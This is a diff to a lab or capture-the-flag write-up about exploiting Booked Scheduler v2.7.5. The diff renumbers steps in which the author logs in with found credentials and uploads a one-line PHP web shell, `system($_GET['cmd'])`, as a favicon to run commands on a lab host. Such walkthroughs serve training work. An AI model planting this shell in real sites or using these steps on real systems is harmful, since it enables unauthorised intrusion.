@@ -146,16 +146,16 @@ I tried the credentials I found earlier `admin:adminadmin` and I got in!
 
 From here I googled "Booked Scheduler v2.7.5 exploit" and I found a [github repo](https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF) that showed how to get remote code execution on this machine. 
 
-There were X simple steps to exploit this machine. 
-1. Navigate to manage_theme.php page
+There were 3 simple steps to exploit this machine. 
+Navigate to manage_theme.php page
 
 ![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image4.png)
 
-2. Upload rce.php `<?php system($_GET['cmd']); ?>` as the Favicon
+Upload rce.php `<?php system($_GET['cmd']); ?>` as the Favicon
 
 ![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image5.png)
 
-3.  Navigate to http://192.168.172.64:8003/booked/Web/custom-favicon.php?cmd= to run commands!
+Navigate to http://192.168.172.64:8003/booked/Web/custom-favicon.php?cmd= to run commands!
 
 ![Zino](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zino/image6.png)
 
